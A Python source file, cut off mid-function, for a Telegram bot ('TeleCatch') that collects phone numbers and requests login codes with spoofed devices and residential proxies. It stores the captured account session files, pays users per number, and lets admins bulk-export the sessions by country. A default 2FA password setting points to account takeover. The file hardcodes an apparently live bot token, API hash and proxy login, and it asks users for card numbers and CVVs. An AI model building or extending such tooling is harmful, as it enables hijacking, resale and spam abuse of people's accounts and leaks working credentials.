import telebot
import sqlite3
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError, PeerFloodError
from telethon.tl import functions
import asyncio
import threading
import os
import phonenumbers
from phonenumbers import geocoder, country_code_for_region
import pycountry
from telebot import types
from telebot.util import escape
import time
import re
import datetime
import secrets
import string
import random
from collections import Counter
import zipfile
import shutil
import logging
import requests
import hashlib
import json
from typing import Dict, List, Optional, Tuple

# ==================== CONFIGURATION ====================
API_TOKEN = "8397203663:AAHePay7u3uqCAmh2AfSVXTnomMC5O6ZeQw"
ADMIN_ID = 6083895678  # Your Admin ID
API_ID = 22065708
API_HASH = "7dbed5a148f3ae11eea9f58bff71b485"

# Channel Configuration
PRIVATE_CHANNEL_LINK = "https://t.me/+9M4KaQILn7FhNDY1"
PRIVATE_CHANNEL_ID = -1002926608627
PUBLIC_CHANNEL_USERNAME = "@telecatch"

# Group IDs
SESSION_GROUP_ID = -1003084355923
WITHDRAW_GROUP_ID = -1002999572063
SPAM_BOT = "@spambot"

# Financial Configuration
MIN_WITHDRAW = 2.0
USD_TO_TRX = 2.78
USD_TO_BDT = 122.0
USD_TO_PKR = 278.5

# Database and Files
DB_FILE = "session_bot.db"
SESSIONS_FOLDER = "sessions"
PROXIES_CONFIG_FILE = "proxies.json"

# Security
MAX_PASSWORD_ATTEMPTS = 3
LOCKOUT_DURATION = 3600  # 1 hour in seconds

# Language Support
LANGUAGES = {
    'en': 'English 🇺🇸',
    'zh': '中文 🇨🇳', 
    'ar': 'العربية 🇦🇪'
}

DEFAULT_LANGUAGE = 'en'

# Create necessary directories
if not os.path.exists(SESSIONS_FOLDER):
    os.makedirs(SESSIONS_FOLDER)

# ==================== LOGGING SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ==================== MULTILANGUAGE SYSTEM ====================
class LanguageManager:
    translations = {
        'en': {
            'welcome': "🎉 Welcome to TeleCatch Session Manager\n\nUse commands to manage your sessions.",
            'balance': "💰 <b>Account Balance</b>\n\n👤 User ID: {user_id}\n✅ Verified Sessions: {verified}\n⏳ Pending Sessions: {pending}\n💵 Available Balance: ${balance:.2f}\n❄️ Frozen Balance: ${frozen:.2f}",
            'withdraw_method': "💳 <b>Select Withdrawal Method</b>\n\nBalance: ${balance:.2f}",
            'withdraw_ld': "💳 LD Card Withdrawal\n\nSend: Card Number|Expiry|CVV|Name",
            'withdraw_usdt': "💵 USDT (BEP20) Withdrawal\n\nSend your USDT address:",
            'frozen_account': "❄️ <b>Account Frozen</b>\n\nYour account has been frozen. Reason: {reason}\nContact administrator.",
            'session_created': "✅ <b>Session Created Successfully!</b>\n\n📱 Number: {phone}\nStatus: Active",
            'enter_phone': "📱 Please send your phone number with country code:\n\nExample: +1234567890",
            'enter_code': "🔐 Enter the 5-digit verification code:",
            'invalid_code': "❌ Invalid code format. Please enter 5 digits.",
            'withdraw_min': "❌ Minimum withdrawal is ${min:.2f}. Your balance: ${balance:.2f}",
            'withdraw_success': "✅ Withdrawal request submitted for ${amount:.2f}",
            'password_set': "🔐 Password set successfully!",
            'language_set': "🌍 Language set to {language}",
            'admin_panel': "👑 <b>Admin Panel</b>",
            'account_frozen_success': "❄️ Account {user_id} frozen. Reason: {reason}",
            'account_unfrozen_success': "✅ Account {user_id} unfrozen",
            'country_added': "✅ Country {country_code} added successfully",
            'country_updated': "✅ Country {country_code} updated successfully",
            'country_removed': "✅ Country {country_code} removed successfully",
            'broadcast_started': "📢 Broadcast started...",
            'broadcast_complete': "📢 Broadcast completed\n✅ Sent: {success}\n❌ Failed: {fail}",
            '2fa_updated': "🔐 2FA password updated to: {password}"
        },
        'zh': {
            'welcome': "🎉 欢迎使用 TeleCatch 会话管理器\n\n使用命令管理您的会话。",
            'balance': "💰 <b>账户余额</b>\n\n👤 用户ID: {user_id}\n✅ 已验证会话: {verified}\n⏳ 待处理会话: {pending}\n💵 可用余额: ${balance:.2f}\n❄️ 冻结余额: ${frozen:.2f}",
            'withdraw_method': "💳 <b>选择提款方式</b>\n\n余额: ${balance:.2f}",
            'withdraw_ld': "💳 LD卡提款\n\n发送: 卡号|有效期|CVV|姓名",
            'withdraw_usdt': "💵 USDT (BEP20) 提款\n\n发送您的USDT地址:",
            'frozen_account': "❄️ <b>账户已冻结</b>\n\n您的账户已被冻结。原因: {reason}\n请联系管理员。",
            'session_created': "✅ <b>会话创建成功!</b>\n\n📱 号码: {phone}\n状态: 活跃",
            'enter_phone': "📱 请发送带有国家代码的电话号码:\n\n例如: +1234567890",
            'enter_code': "🔐 输入5位验证码:",
            'invalid_code': "❌ 验证码格式错误。请输入5位数字。",
            'withdraw_min': "❌ 最低提款额为 ${min:.2f}。您的余额: ${balance:.2f}",
            'withdraw_success': "✅ 已提交 ${amount:.2f} 的提款请求",
            'password_set': "🔐 密码设置成功!",
            'language_set': "🌍 语言已设置为 {language}",
            'admin_panel': "👑 <b>管理员面板</b>",
            'account_frozen_success': "❄️ 账户 {user_id} 已冻结。原因: {reason}",
            'account_unfrozen_success': "✅ 账户 {user_id} 已解冻",
            'country_added': "✅ 国家 {country_code} 添加成功",
            'country_updated': "✅ 国家 {country_code} 更新成功",
            'country_removed': "✅ 国家 {country_code} 删除成功",
            'broadcast_started': "📢 广播开始...",
            'broadcast_complete': "📢 广播完成\n✅ 发送成功: {success}\n❌ 发送失败: {fail}",
            '2fa_updated': "🔐 2FA密码已更新为: {password}"
        },
        'ar': {
            'welcome': "🎉 مرحبًا بك في مدير جلسات TeleCatch\n\nاستخدم الأوامر لإدارة جلساتك.",
            'balance': "💰 <b>رصيد الحساب</b>\n\n👤 رقم المستخدم: {user_id}\n✅ الجلسات المؤكدة: {verified}\n⏳ الجلسات قيد الانتظار: {pending}\n💵 الرصيد المتاح: ${balance:.2f}\n❄️ الرصيد المجمد: ${frozen:.2f}",
            'withdraw_method': "💳 <b>اختر طريقة السحب</b>\n\nالرصيد: ${balance:.2f}",
            'withdraw_ld': "💳 سحب بطاقة LD\n\nأرسل: رقم البطاقة|انتهاء الصلاحية|CVV|الاسم",
            'withdraw_usdt': "💵 سحب USDT (BEP20)\n\nأرسل عنوان USDT الخاص بك:",
            'frozen_account': "❄️ <b>الحساب مجمد</b>\n\nتم تجميد حسابك. السبب: {reason}\nيرجى الاتصال بالإدارة.",
            'session_created': "✅ <b>تم إنشاء الجلسة بنجاح!</b>\n\n📱 الرقم: {phone}\nالحالة: نشط",
            'enter_phone': "📱 يرجى إرسال رقم هاتفك مع رمز الدولة:\n\nمثال: +1234567890",
            'enter_code': "🔐 أدخل رمز التحقق المكون من 5 أرقام:",
            'invalid_code': "❌ تنسيق الرمز غير صالح. يرجى إدخال 5 أرقام.",
            'withdraw_min': "❌ الحد الأدنى للسحب هو ${min:.2f}. رصيدك: ${balance:.2f}",
            'withdraw_success': "✅ تم تقديم طلب سحب بقيمة ${amount:.2f}",
            'password_set': "🔐 تم تعيين كلمة المرور بنجاح!",
            'language_set': "🌍 تم تعيين اللغة إلى {language}",
            'admin_panel': "👑 <b>لوحة الإدارة</b>",
            'account_frozen_success': "❄️ تم تجميد الحساب {user_id}. السبب: {reason}",
            'account_unfrozen_success': "✅ تم فك تجميد الحساب {user_id}",
            'country_added': "✅ تمت إضافة الدولة {country_code} بنجاح",
            'country_updated': "✅ تم تحديث الدولة {country_code} بنجاح",
            'country_removed': "✅ تمت إزالة الدولة {country_code} بنجاح",
            'broadcast_started': "📢 بدأ البث...",
            'broadcast_complete': "📢 اكتمل البث\n✅ تم الإرسال: {success}\n❌ فشل الإرسال: {fail}",
            '2fa_updated': "🔐 تم تحديث كلمة مرور 2FA إلى: {password}"
        }
    }

    @staticmethod
    def get_text(key: str, language: str = 'en', **kwargs) -> str:
        """Get translated text with formatting"""
        text = LanguageManager.translations.get(language, {}).get(key, key)
        return text.format(**kwargs) if kwargs else text

    @staticmethod
    def get_user_language(user_id: int) -> str:
        """Get user's preferred language"""
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT language FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        conn.close()
        return result[0] if result else DEFAULT_LANGUAGE

    @staticmethod
    def set_user_language(user_id: int, language: str):
        """Set user's preferred language"""
        if language in LANGUAGES:
            conn = sqlite3.connect(DB_FILE, check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute("UPDATE users SET language = ? WHERE user_id = ?", (language, user_id))
            conn.commit()
            conn.close()

# ==================== DATABASE MANAGEMENT ====================
def init_db():
    """Initialize database with frozen account support"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    
    # Enhanced users table with frozen account support
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            full_name TEXT,
            balance REAL DEFAULT 0,
            frozen_balance REAL DEFAULT 0,
            session_count INTEGER DEFAULT 0,
            verified_count INTEGER DEFAULT 0,
            unverified_count INTEGER DEFAULT 0,
            claimed_numbers TEXT DEFAULT "",
            pending_numbers TEXT DEFAULT "",
            join_date TEXT,
            language TEXT DEFAULT 'en',
            withdraw_password TEXT,
            password_attempts INTEGER DEFAULT 0,
            account_locked INTEGER DEFAULT 0,
            account_frozen INTEGER DEFAULT 0,
            lock_until INTEGER DEFAULT 0,
            frozen_reason TEXT DEFAULT ""
        )
    """)
    
    # Country rates table - CORRECTED to have 7 columns
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS country_rates (
            country_code TEXT PRIMARY KEY,
            country_name TEXT,
            rate REAL NOT NULL,
            claim_time_seconds INTEGER NOT NULL,
            status TEXT NOT NULL DEFAULT "on",
            capacity INTEGER NOT NULL DEFAULT 10,
            usage_count INTEGER NOT NULL DEFAULT 0
        )
    """)
    
    # Used numbers table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS used_numbers (
            phone_number TEXT PRIMARY KEY,
            user_id INTEGER NOT NULL
        )
    """)
    
    # Enhanced withdraw history
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS withdraw_history (
            withdraw_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            amount REAL NOT NULL,
            address TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            trans_no TEXT,
            transaction_id TEXT,
            currency TEXT,
            status TEXT DEFAULT 'pending',
            admin_notes TEXT
        )
    """)
    
    # Admins table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS admins (
            user_id INTEGER PRIMARY KEY,
            role TEXT DEFAULT 'admin'
        )
    """)
    
    # Settings table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    
    # User sessions table for tracking
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_sessions (
            session_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            phone_number TEXT NOT NULL,
            country_code TEXT,
            status TEXT DEFAULT 'pending',
            created_at TEXT,
            completed_at TEXT
        )
    """)
    
    # Insert default data
    cursor.execute("INSERT OR IGNORE INTO admins (user_id, role) VALUES (?, ?)", (ADMIN_ID, 'superadmin'))
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('withdraw_status', 'on')")
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('2fa_status', 'on')")
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('2fa_password', 'TeleCatch2024!')")
    
    # Insert default country rates - CORRECTED to match 7 columns and TG changed to Togo
    default_rates = [
        ("BD", "Bangladesh", 10.0, 30, "on", 20, 0),
        ("SA", "Saudi Arabia", 20.0, 60, "on", 15, 0),
        ("IN", "India", 8.0, 20, "on", 25, 0),
        ("US", "United States", 25.0, 45, "on", 10, 0),
        ("TG", "Togo", 15.0, 40, "on", 15, 0)  # Changed from Telegram to Togo
    ]
    
    for rate in default_rates:
        cursor.execute("INSERT OR IGNORE INTO country_rates VALUES (?, ?, ?, ?, ?, ?, ?)", rate)
    
    conn.commit()
    conn.close()
    logger.info("Database initialized successfully")

def migrate_db():
    """Safe database migration"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        
        # Check and add new columns to users table
        columns_to_add = [
            ('language', 'TEXT DEFAULT "en"'),
            ('withdraw_password', 'TEXT'),
            ('password_attempts', 'INTEGER DEFAULT 0'),
            ('account_locked', 'INTEGER DEFAULT 0'),
            ('lock_until', 'INTEGER DEFAULT 0'),
            ('account_frozen', 'INTEGER DEFAULT 0'),
            ('frozen_balance', 'REAL DEFAULT 0'),
            ('frozen_reason', 'TEXT DEFAULT ""')
        ]
        
        cursor.execute("PRAGMA table_info(users)")
        existing_columns = [col[1] for col in cursor.fetchall()]
        
        for col_name, col_type in columns_to_add:
            if col_name not in existing_columns:
                cursor.execute(f"ALTER TABLE users ADD COLUMN {col_name} {col_type}")
                logger.info(f"Added column {col_name} to users table")
        
        # Check country_rates table structure and fix if needed
        cursor.execute("PRAGMA table_info(country_rates)")
        country_columns = [col[1] for col in cursor.fetchall()]
        
        # If table doesn't exist or has wrong structure, recreate it
        if not country_columns or len(country_columns) != 7:
            # Drop and recreate the table with correct structure
            cursor.execute("DROP TABLE IF EXISTS country_rates")
            cursor.execute("""
                CREATE TABLE country_rates (
                    country_code TEXT PRIMARY KEY,
                    country_name TEXT,
                    rate REAL NOT NULL,
                    claim_time_seconds INTEGER NOT NULL,
                    status TEXT NOT NULL DEFAULT "on",
                    capacity INTEGER NOT NULL DEFAULT 10,
                    usage_count INTEGER NOT NULL DEFAULT 0
                )
            """)
            logger.info("Recreated country_rates table with correct structure")
            
            # Reinsert default data with TG as Togo
            default_rates = [
                ("BD", "Bangladesh", 10.0, 30, "on", 20, 0),
                ("SA", "Saudi Arabia", 20.0, 60, "on", 15, 0),
                ("IN", "India", 8.0, 20, "on", 25, 0),
                ("US", "United States", 25.0, 45, "on", 10, 0),
                ("TG", "Togo", 15.0, 40, "on", 15, 0)  # Changed from Telegram to Togo
            ]
            
            for rate in default_rates:
                cursor.execute("INSERT OR IGNORE INTO country_rates VALUES (?, ?, ?, ?, ?, ?, ?)", rate)
        else:
            # Check if country_name column exists and add if missing
            if 'country_name' not in country_columns:
                cursor.execute("ALTER TABLE country_rates ADD COLUMN country_name TEXT")
                logger.info("Added country_name column to country_rates table")
        
        conn.commit()
        conn.close()
        logger.info("Database migration completed successfully")
        
    except Exception as e:
        logger.error(f"Migration error: {e}")

# Initialize database
init_db()
migrate_db()

# ==================== BOT INITIALIZATION ====================
bot = telebot.TeleBot(API_TOKEN, parse_mode='HTML')
user_data = {}

# Country-specific proxies (from original, adapted)
proxies = {
    "BD": None,
    "SA": None,
    "IN": None,
    "US": None,
    "TG": {
        "proxy_type": "socks5",
        "addr": "93.190.141.105",
        "port": 9999,
        "username": "mmk5faqpdh-corp.mobile.res-country-TG-state-3653224-city-3652462-hold-query",
        "password": "vTFdOUgHfFeHFHA8"
    }
}

# ==================== SECURITY FUNCTIONS ====================
def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM admins WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

def is_account_frozen(user_id: int) -> Tuple[bool, str]:
    """Check if account is frozen and return reason"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT account_frozen, frozen_reason FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result and result[0] == 1:
        return True, result[1] or "No reason provided"
    return False, ""

def freeze_account(user_id: int, reason: str = ""):
    """Freeze user account and move balance to frozen"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    
    if result:
        current_balance = result[0]
        cursor.execute("""
            UPDATE users 
            SET account_frozen = 1, frozen_reason = ?, frozen_balance = ?, balance = 0 
            WHERE user_id = ?
        """, (reason, current_balance, user_id))
    
    conn.commit()
    conn.close()

def unfreeze_account(user_id: int):
    """Unfreeze user account and restore balance"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute("SELECT frozen_balance FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    
    if result:
        frozen_balance = result[0]
        cursor.execute("""
            UPDATE users 
            SET account_frozen = 0, frozen_reason = '', balance = ?, frozen_balance = 0 
            WHERE user_id = ?
        """, (frozen_balance, user_id))
    
    conn.commit()
    conn.close()

def check_account_lock(user_id: int) -> Tuple[bool, str]:
    """Check if account is locked due to password attempts"""
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT account_locked, lock_until FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        return False, ""
    
    locked, lock_until = result
    if locked and lock_until > time.time():
        remaining = int(lock_until - time.time())
        return True, f"Account locked. Please try again in {remaining//60} minutes."
    
    # Reset if lock expired
    if locked:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET account_locked = 0, password_attempts = 0 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
    
    return False, ""

def verify_withdraw_password(user_id: int, password: str) -> Tuple[bool, str]:
    """Verify withdraw password with attempt tracking"""
    # Check account lock first
    locked, message = check_account_lock(user_id)
    if locked:
        return False, message
    
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT withdraw_password, password_attempts FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    
    if not result or not result[0]:
        conn.close()
        return False, "Withdraw password not set. Please use /setpassword first."
    
    stored_password, attempts = result
    
    if PasswordManager.verify_password(password, stored_password):
        # Reset attempts on success
        cursor.execute("UPDATE users SET password_attempts = 0 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        return True, "Password verified successfully."
    else:
        # Increment attempts
        new_attempts = attempts + 1
        cursor.execute("UPDATE users SET password_attempts = ? WHERE user_id = ?", (new_attempts, user_id))
        
        if new_attempts >= MAX_PASSWORD_ATTEMPTS:
            lock_until = time.time() + LOCKOUT_DURATION
            cursor.execute("UPDATE users SET account_locked = 1, lock_until = ? WHERE user_id = ?", (lock_until, user_id))
            conn.commit()
            conn.close()
            return False, f"Too many failed attempts. Account locked for {LOCKOUT_DURATION//60} minutes."
        
        conn.commit()
        conn.close()
        remaining = MAX_PASSWORD_ATTEMPTS - new_attempts
        return False, f"Invalid password. {remaining} attempts remaining."

def set_withdraw_password(user_id: int, password: str) -> bool:
    """Set withdraw password for user"""
    hashed_password = PasswordManager.hash_password(password)
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET withdraw_password = ?, password_attempts = 0, account_locked = 0 WHERE user_id = ?", 
                   (hashed_password, user_id))
    conn.commit()
    conn.close()
    return True

# ==================== PASSWORD SECURITY ====================
class PasswordManager:
    @staticmethod
    def hash_password(password: str) -> str:
        """Hash password using SHA-256"""
        return hashlib.sha256(password.encode()).hexdigest()
    
    @staticmethod
    def verify_password(plain_password: str, hashed_password: str) -> bool:
        """Verify password against hash"""
        return PasswordManager.hash_password(plain_password) == hashed_password
    
    @staticmethod
    def generate_random_password(length: int = 8) -> str:
        """Generate random password"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

# ==================== SESSION FILE MANAGEMENT ====================
def create_session_zip(user_id: int, phone_number: str) -> Optional[str]:
    """Create zip file for session"""
    try:
        zip_filename = f"{SESSIONS_FOLDER}/{user_id}_{phone_number}.zip"
        session_file = f"{SESSIONS_FOLDER}/{user_id}_{phone_number}.session"
        
        if os.path.exists(session_file):
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(session_file, os.path.basename(session_file))
            return zip_filename
        return None
    except Exception as e:
        logger.error(f"Error creating zip: {e}")
        return None

def create_and_send_session_zips(chat_id):
    country_sessions = {}
    logging.info(f"Checking session files in {SESSIONS_FOLDER}")
    if not os.path.exists(SESSIONS_FOLDER):
        logging.error("Sessions folder does not exist!")
        bot.send_message(chat_id, "❌ Error: Sessions folder not found. Please ensure session files are saved.")
        return

    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT phone_number FROM used_numbers")
    claimed_phones = [row[0] for row in cursor.fetchall()]
    conn.close()

    for filename in os.listdir(SESSIONS_FOLDER):
        if filename.endswith(".session"):
            phone_number = filename.replace(".session", "")
            if phone_number in claimed_phones:
                session_path = os.path.join(SESSIONS_FOLDER, filename)
                logging.info(f"Processing claimed session file: {filename}")
                country_info = get_country_info(phone_number)
                if country_info["code"]:
                    country_code = country_info["code"]
                    country_sessions[country_code] = country_sessions.get(country_code, 0) + 1
                else:
                    logging.warning(f"Could not determine country code for phone number: {phone_number}")

    if not country_sessions:
        bot.send_message(chat_id, "𝐂𝐡𝐞𝐜𝐤 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 🎛Statistic:\n\n❌ No claimed sessions found.")
        return

    stat_message = "𝐂𝐡𝐞𝐜𝐤 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 🎛Statistic:\n\n"
    for country_code, count in country_sessions.items():
        flag = "".join(chr(ord(c) + 127397) for c in country_code.upper())
        try:
            country_name = pycountry.countries.get(alpha_2=country_code).name
            dial_code = country_code_for_region(country_code)
            stat_message += f"{flag} {country_name} (+{dial_code}) => {count}\n"
        except Exception as e:
            logging.error(f"Error formatting country {country_code}: {e}")
            stat_message += f"{flag} +{country_code} => {count}\n"
    bot.send_message(chat_id, stat_message, parse_mode="Markdown")

    for country_code, count in country_sessions.items():
        zip_filename = f"+{country_code} all session file - {count}.zip"
        logging.info(f"Creating ZIP file: {zip_filename}")
        with zipfile.ZipFile(zip_filename, "w") as zipf:
            for filename in os.listdir(SESSIONS_FOLDER):
                if filename.endswith(".session"):
                    phone_number = filename.replace(".session", "")
                    if phone_number in claimed_phones:
                        session_path = os.path.join(SESSIONS_FOLDER, filename)
                        country_info = get_country_info(phone_number)
                        if country_info["code"] == country_code:
                            zipf.write(session_path, arcname=filename)
        if os.path.getsize(zip_filename) > 0:
            with open(zip_filename, "rb") as zip_file:
                bot.send_document(chat_id, zip_file, caption=f"{count} claimed session file(s) for +{country_code}")
            os.remove(zip_filename)
        else:
            logging.warning(f"ZIP file {zip_filename} is empty, not sending.")
            os.remove(zip_filename)

def show_clear_confirmation(message):
    markup = types.InlineKeyboardMarkup()
    yes_button = types.InlineKeyboardButton("Yes", callback_data="admin_confirm_clear_sessions")
    no_button = types.InlineKeyboardButton("No", callback_data="admin_cancel_clear_sessions")
    markup.add(yes_button, no_button)
    bot.send_message(message.chat.id, "Are you sure you want to delete all session files?", reply_markup=markup)

def clear_session_files(chat_id):
    for filename in os.listdir(SESSIONS_FOLDER):
        file_path = os.path.join(SESSIONS_FOLDER, filename)
        if os.path.isfile(file_path):
            os.remove(file_path)
    bot.send_message(chat_id, "✅ All session files have been deleted.")

# ==================== UTILITY FUNCTIONS ====================
def get_country_info(phone_number: str) -> Dict:
    """Get country information from phone number"""
    try:
        parsed_number = phonenumbers.parse(phone_number)
        country_code = geocoder.region_code_for_number(parsed_number)
        dial_code = parsed_number.country_code
        return {"code": country_code, "dial_code": dial_code, "valid": True}
    except Exception as e:
        logger.error(f"Phone number parsing error: {e}")
        return {"code": None, "dial_code": None, "valid": False}

def get_country_flag(country_code: str) -> str:
    """Get country flag emoji from country code"""
    if not country_code:
        return "🌍"
    try:
        return "".join(chr(ord(c) + 127397) for c in country_code.upper())
    except:
        return "🌍"

def generate_device_info():
    """Generate random device information"""
    devices = [
        {"model": "iPhone 14 Pro", "version": "iOS 17.1", "app": "10.5.5"},
        {"model": "Samsung Galaxy S23", "version": "Android 14", "app": "10.5.5"},
        {"model": "Google Pixel 7", "version": "Android 14", "app": "10.5.5"},
        {"model": "Xiaomi 13", "version": "Android 13", "app": "10.5.5"}
    ]
    device = random.choice(devices)
    return {
        "device_model": device["model"],
        "system_version": device["version"],
        "app_version": device["app"],
        "lang_code": "en"
    }

def generate_transaction_id() -> str:
    """Generate unique transaction ID"""
    return f"TC{int(time.time())}{random.randint(1000, 9999)}"

def generate_trans_no():
    """Generate transaction number"""
    return ''.join(random.choices(string.digits, k=10))

# ==================== COUNTRY MANAGEMENT FUNCTIONS ====================
def add_country(country_code: str, country_name: str, rate: float, claim_time: int, capacity: int, status: str = "on") -> bool:
    """Add new country to database"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("""
            INSERT OR REPLACE INTO country_rates 
            (country_code, country_name, rate, claim_time_seconds, status, capacity, usage_count)
            VALUES (?, ?, ?, ?, ?, ?, 0)
        """, (country_code, country_name, rate, claim_time, status, capacity))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"Error adding country: {e}")
        return False

def update_country(country_code: str, **kwargs) -> bool:
    """Update country information"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        
        valid_fields = ['rate', 'claim_time_seconds', 'status', 'capacity', 'country_name']
        updates = []
        values = []
        
        for field, value in kwargs.items():
            if field in valid_fields:
                updates.append(f"{field} = ?")
                values.append(value)
        
        if updates:
            values.append(country_code)
            query = f"UPDATE country_rates SET {', '.join(updates)} WHERE country_code = ?"
            cursor.execute(query, values)
            conn.commit()
        
        conn.close()
        return True
    except Exception as e:
        logger.error(f"Error updating country: {e}")
        return False

def remove_country(country_code: str) -> bool:
    """Remove country from database"""
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM country_rates WHERE country_code = ?", (country_code,))
        conn.commit()
        conn.close()
        return cursor.rowcount > 0
    except Exception as e:
        logger.error(f"Error removing country: {e}")
        return False

def get_country_code_from_name(country_name):
    try:
        country = pycountry.countries.search_fuzzy(country_name)
        return country[0].alpha_2
    except:
        return None

# ==================== CHANNEL MEMBERSHIP CHECK ====================
def check_channel_membership(user_id: int) -> bool:
    """Check if user is member of the channel"""
    try:
        member = bot.get_chat_member(PUBLIC_CHANNEL_USERNAME, user_id)
        return member.status in ["member", "administrator", "creator"]
    except telebot.apihelper.ApiTelegramException as e:
        if "user not found" in str(e).lower():
            return False
        logger.error(f"Channel membership check error: {e}")
        return False

def send_join_channel_message(chat_id):
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton("Join Our Channel", url=PRIVATE_CHANNEL_LINK)
    markup.add(join_button)
    text = ("🎉 Welcome To Our Robot\n\n"
            "🧑‍💻 Please Work Honestly 🚀\n\n"
            "You must join our channel to use this bot. After joining, send /start again.")
    try:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Error sending join message to {chat_id}: {e}")

def check_bot_permissions():
    try:
        bot.get_chat(SESSION_GROUP_ID)
        logging.info("✅ Connected to Session Group.")
        bot.get_chat(WITHDRAW_GROUP_ID)
        logging.info("✅ Connected to Withdraw Group.")
        bot.get_chat(PUBLIC_CHANNEL_USERNAME)
        logging.info(f"✅ Connected to Channel: {PUBLIC_CHANNEL_USERNAME}")
        return True
    except Exception as e:
        logging.error(f"❌ CRITICAL ERROR: Could not connect to a required chat. Error: {e}")
        return False

# ==================== SESSION CREATION FUNCTIONS ====================
async def check_spam_status(client, phone, chat_id, processing_msg_id):
    try:
        await client.send_message(SPAM_BOT, "/start")
        await asyncio.sleep(2)
        messages = await client.get_messages(SPAM_BOT, limit=1)
        if messages and "Unfortunately, some actions can trigger a harsh response from our anti-spam systems" in messages[0].text:
            return True
        return False
    except Exception as e:
        logging.error(f"Error checking spam status for {phone}: {e}")
        bot.edit_message_text(f"⚠️ Error checking spam status for {phone}. Please try again.", chat_id, processing_msg_id)
        return False

async def send_verification_code(chat_id: int, phone_number: str, message_id: int):
    """Send verification code to phone (adapted from original send_login_code)"""
    try:
        country_info = get_country_info(phone_number)
        country_code = country_info["code"]
        proxy = proxies.get(country_code)
        device_info = generate_device_info()

        session_filename = f"{chat_id}{phone_number}.session"
        client = TelegramClient(session_filename, API_ID, API_HASH, proxy=proxy, device_model=device_info["device_model"], system_version=device_info["system_version"], app_version=device_info["app_version"], lang_code=device_info["lang_code"])
        await client.connect()
        sent_code_info = await client.send_code_request(phone_number)
        user_data[chat_id] = {"phone_code_hash": sent_code_info.phone_code_hash, "session_filename": session_filename, "phone": phone_number, "state": "awaiting_code"}
        
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        new_pending_str = f"{pending_str},{phone_number}" if pending_str else phone_number
        cursor.execute("UPDATE users SET pending_numbers = ?, unverified_count = unverified_count + 1 WHERE user_id = ?", (new_pending_str, chat_id))
        conn.commit()
        conn.close()

        flag = get_country_flag(country_code)
        msg_text = f"{flag} The code has been sent to the number: {phone_number}\n\n/cancel"
